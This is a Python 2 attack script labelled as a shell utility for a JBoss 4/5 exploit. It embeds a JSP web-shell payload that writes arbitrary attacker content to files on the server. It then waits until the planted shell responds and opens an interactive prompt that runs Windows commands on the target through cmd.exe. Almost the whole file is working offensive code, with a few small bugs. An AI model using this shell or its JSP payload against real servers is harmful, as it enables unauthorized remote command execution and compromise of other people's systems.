import requests
import time

class jshell:
	poster = """^<^%@ page  import="java.io.*,java.net.*,java.util.*" ^%^> 
		^<^%  
		String myPath=System.getProperty("jboss.server.home.dir");
		String contentType = request.getContentType();  
		if (contentType != null)  
		{
		String fixpath=request.getParameter("fixpath");
		myPath=myPath+fixpath;
		String mypost=request.getParameter("mypost");
		BufferedWriter output = new BufferedWriter(new FileWriter(myPath));
		output.write(mypost);
		output.close();
		}
		%>
	"""
	def start(self,url,ntries):
		print "[+] Checking for presence of shell"
		
		while ntries > 0:
			print "\t[-] Sending request"
			res = requests.get(url,verify=False)
			if(res.status_code == 200):
				print "[+] Found our shell, lets go!"
				self.shell(url)
			else:
				print "Status code: %s"%(res.status_code)
				print "\t[-] Couldn't access the shell.. Sleeping for 3 seconds and then trying again. %s tries left"%(ntries)
				time.sleep(3)
				ntries = ntries - 1
			
	def shell(self,url):	
		print ""
		print "*" * 10
		print "JBoss shell utility for use with jboss 4, 5 exploit."
		print "(C) Jonathan James, Areusecure AB (jj@areusecure.se)"
		print "Enter .quit to quit, .h for command history, .user for username"
		print "*" * 10
		print ""

		input = ""

		while(input != ".quit"):
			cmd_history = []
			input = raw_input("jj-shell>")
			
			if(input != "" and input != ".quit"):
				if(input == ".h"): 
					for c in cmd_history: print c
				elif(input == ".user"):
					print "Getting user which JBoss is running as.."
					input = "echo %USERNAME%"
					self.sendcmd(input)
				else:
					cmd_history.append(input)
					self.sendcmd(input)
			
		print "Thanks for playing!"
		exit(0)
	
	def sendcmd(self,cmd):
		cmddir = "c:\windows\system32\cmd.exe /c"
		seconds = 5 #Timeout for our requests
		res = requests.get(url,params={'c':cmddir + cmd},timeout=seconds,verify=False)
		if(res.status_code == 200):
			print res.text
		elif(res.status_code == 500):
			res = requests.get(url,params={'c':cmd},timeout=seconds,verify=False)
			if(res.status_code == 200):
				print res.text
		else:
			print "[+] Oops, server returned status code: %s"%(res.status_code)
			print "\t[-] Maybe cmd.exe isn't located at %s ?"

if __name__ == "__main__":
	url = raw_input("Enter url: ")
	s = jshell()
	s.start(url,5)
	
	
